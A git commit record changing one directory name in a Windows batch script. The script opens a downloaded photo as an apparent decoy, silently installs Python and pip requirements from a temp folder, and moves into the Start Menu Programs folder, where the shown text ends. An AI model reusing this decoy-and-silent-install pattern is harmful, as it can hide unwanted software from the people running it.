15c1b38dc7021fbef0e2b30a22beb6887904b65a
Swapnil Subhash Harale <143025736+root7454@users.noreply.github.com>
2024-05-29 00:10:18 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,7 @@
 cd %temp%
 curl -o imp.jpg https://media.tacdn.com/media/attractions-splice-spp-674x446/0b/39/a9/9f.jpg
 imp.jpg
-cd system/all-main
+cd system/Testing-main
 python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
 pip install -r requirements.txt
 cd %AppData%\Microsoft\Windows\Start Menu\Programs
